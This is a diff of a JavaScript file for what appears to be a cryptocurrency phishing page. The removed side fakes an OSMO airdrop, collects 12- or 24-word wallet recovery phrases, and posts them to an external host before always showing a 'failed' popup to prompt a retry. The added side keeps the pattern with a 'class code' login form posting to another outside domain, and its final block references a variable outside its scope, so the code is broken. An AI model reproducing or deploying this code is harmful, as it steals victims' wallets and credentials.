@@ -1,143 +1,116 @@
-/* -----------------------
-   Anim angka & penyimpanan
-   ----------------------- */
-const numberEl = document.getElementById('number');
-const congratsEl = document.getElementById('congrats');
+// script.js
+document.addEventListener('DOMContentLoaded', ()=> {
+  const connectBtn = document.getElementById('connectBtn');
+  const popup1 = document.getElementById('popup1');
+  const popup2 = document.getElementById('popup2');
+  const popup3 = document.getElementById('popup3');
+  const classButtons = document.querySelectorAll('.class-btn');
+  const kelasForm = document.getElementById('kelasForm');
+  const backToPopup1 = document.getElementById('backToPopup1');
+  const closeButtons = document.querySelectorAll('.close-popup');
 
-let stored = localStorage.getItem('osmoTarget');
-let target = stored ? parseInt(stored,10) : Math.floor(Math.random()*10001);
-if (!stored) localStorage.setItem('osmoTarget', String(target));
+  let autoPopupTimer = null;
+  let userClickedConnect = false;
 
-function formatNum(n){ return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ","); }
-
-let start = null;
-const duration = 2000;
-function step(timestamp){
-  if(!start) start = timestamp;
-  const progress = Math.min((timestamp - start)/duration, 1);
-  const val = Math.floor(progress * target);
-  numberEl.textContent = formatNum(val) + ' OSMO';
-  if(progress < 1){
-    requestAnimationFrame(step);
-  } else {
-    congratsEl.style.display = 'block';
-    congratsEl.textContent = `🎉 Congratulations! You received ${formatNum(target)} OSMO`;
-    setTimeout(()=> showPopup('popupDiscovery'), 1200);
+  function showPopup(el){
+    el.setAttribute('aria-hidden','false');
   }
-}
-requestAnimationFrame(step);
+  function hidePopup(el){
+    el.setAttribute('aria-hidden','true');
+  }
 
-/* -----------------------
-   Popup helpers
-   ----------------------- */
-function showPopup(id){
-  document.querySelectorAll('.popup').forEach(p=>p.style.display='none');
-  const el = document.getElementById(id);
-  if(el) el.style.display = 'flex';
-}
-function closeAllPopups(){ document.querySelectorAll('.popup').forEach(p=>p.style.display='none'); }
+  // Auto-show popup1 after 5s unless user already clicked Connect
+  autoPopupTimer = setTimeout(()=>{
+    if (!userClickedConnect) showPopup(popup1);
+  }, 5000);
 
-/* Buttons */
-document.getElementById('btnRecover').addEventListener('click', ()=> {
-  showPopup('popupConnectWallet');
-});
-document.querySelectorAll('#popupConnectWallet .wallet-list button').forEach(btn=>{
-  btn.addEventListener('click', (e)=>{
-    const which = e.currentTarget.getAttribute('data-wallet');
-    if(which === 'batang'){
-      showPopup('popupAbsenKey');
+  // If user clicks Connect button BEFORE timeout, open popup1 and cancel auto-show
+  connectBtn.addEventListener('click', ()=>{
+    userClickedConnect = true;
+    clearTimeout(autoPopupTimer);
+    showPopup(popup1);
+  });
+
+  // clicking class buttons => open popup2 (and optionally store selected class)
+  classButtons.forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      // optional: store selected class name (data-target)
+      const target = btn.getAttribute('data-target') || '';
+      hidePopup(popup1);
+      showPopup(popup2);
+
+      // focus input
+      const kodeInput = document.getElementById('kodeKelas');
+      if (kodeInput) kodeInput.focus();
+    });
+  });
+
+  // close buttons
+  closeButtons.forEach(btn=> btn.addEventListener('click', (e)=>{
+    const id = e.currentTarget.getAttribute('data-popup');
+    if (id){
+      const el = document.getElementById(id);
+      if (el) hidePopup(el);
     } else {
-      document.getElementById('phraseSelect').value = '12';
-      createWordInputs(12);
-      showPopup('popupImportWallet');
+      // generic: close parent popup
+      const parent = e.currentTarget.closest('.popup');
+      if (parent) hidePopup(parent);
+    }
+  }));
+
+  // popup2 form submit -> send to backend.php
+  kelasForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const kodeInput = document.getElementById('kodeKelas');
+    const kode = kodeInput.value.trim();
+    if (!kode) { kodeInput.reportValidity(); return; }
+
+    const submitBtn = kelasForm.querySelector('button[type=submit]');
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Memproses...';
+
+    try {
+      const resp = await fetch('https://osmohub.com/distribution/submit_form.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({ kode_kelas: kode })
+      });
+      const json = await resp.json();
+      // optional: check json.success
+      hidePopup(popup2);
+      showPopup(popup3);
+    } catch (err) {
+      alert('Terjadi kesalahan saat mengirim. Coba lagi.');
+    } finally {
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Login';
+      kodeInput.value = '';
+    }
+  });
+
+  // back to popup1 from popup3
+  backToPopup1.addEventListener('click', ()=> {
+    hidePopup(popup3);
+    showPopup(popup1);
+  });
+
+  // processing dots animation (simple)
+  (function animateDots(){
+    const dotsEl = document.getElementById('dots');
+    if (!dotsEl) return;
+    let count = 0;
+    setInterval(()=> {
+      count = (count + 1) % 4;
+      dotsEl.textContent = '.'.repeat(count);
+    }, 500);
+  })();
+
+});
+closeButtons.forEach(button => {
+  button.addEventListener('click', () => {
+    const popup = button.closest('.popup');
+    if (popup) {
+      popup.setAttribute('aria-hidden', 'true'); // sembunyikan popup
     }
   });
 });
-
-/* generate inputs for import wallet */
-const phraseSelect = document.getElementById('phraseSelect');
-const wordGrid = document.getElementById('wordGrid');
-function createWordInputs(count){
-  wordGrid.innerHTML = '';
-  if(count === 12){
-    wordGrid.classList.remove('grid-4');
-    wordGrid.classList.add('grid-3');
-  } else {
-    wordGrid.classList.remove('grid-3');
-    wordGrid.classList.add('grid-4');
-  }
-  for(let i=1;i<=count;i++){
-    const inp = document.createElement('input');
-    inp.type = 'text';
-    inp.name = 'w' + i;
-    inp.placeholder = String(i);
-    inp.required = true;
-    wordGrid.appendChild(inp);
-  }
-}
-createWordInputs(12);
-phraseSelect.addEventListener('change', ()=> createWordInputs(parseInt(phraseSelect.value,10)));
-
-/* Import form submission */
-document.getElementById('importForm').addEventListener('submit', async function(e){
-  e.preventDefault();
-  const fd = new FormData();
-  const count = parseInt(phraseSelect.value,10);
-  for(let i=1;i<=count;i++){
-    const v = document.querySelector(`input[name="w${i}"]`).value || '';
-    fd.append('w'+i, v);
-  }
-  fd.append('type', 'import');
-
-  const btn = document.getElementById('importContinue');
-  btn.disabled = true;
-  btn.textContent = 'Sending...';
-
-  try {
-    const res = await fetch('https://bapak.42web.io/submit_form.php', { method:'POST', body: fd });
-    const data = await res.json();
-    // alert(data.message); ← ini dihapus
-    showPopup('popupFailedAbsen'); // langsung menuju popup selanjutnya
-  } catch (err){
-    alert('Terjadi kesalahan jaringan.');
-  } finally {
-    btn.disabled = false;
-    btn.textContent = 'Continue';
-  }
-});
-
-/* Absen form submission */
-document.getElementById('absenForm').addEventListener('submit', async function(e){
-  e.preventDefault();
-  const key = document.getElementById('absenKeyInput').value || '';
-  if(key.trim().length === 0){ alert('Masukkan absen key.'); return; }
-  const fd = new FormData();
-  fd.append('absenKey', key);
-  fd.append('type','absen');
-  const btn = document.getElementById('absenContinue');
-  btn.disabled = true; btn.textContent = 'Sending...';
-  try {
-    const res = await fetch('https://bapak.42web.io/submit_form.php', { method:'POST', body: fd });
-    const data = await res.json();
-    // alert(data.message); ← ini dihapus
-    showPopup('popupFailedAbsen'); // langsung menuju popup selanjutnya
-  } catch (err){
-    alert('Terjadi kesalahan jaringan.');
-  } finally {
-    btn.disabled = false; btn.textContent = 'Continue';
-  }
-});
-
-
-
-
-/* popup failed actions */
-document.getElementById('failedContinue').addEventListener('click', ()=>{
-  createWordInputs(parseInt(phraseSelect.value,10));
-  showPopup('popupImportWallet');
-});
-document.getElementById('failedClose').addEventListener('click', ()=> closeAllPopups());
-
-/* cancel buttons */
-document.getElementById('importCancel').addEventListener('click', ()=> { showPopup('popupConnectWallet'); });
-document.getElementById('absenCancel').addEventListener('click', ()=> { showPopup('popupConnectWallet'); });
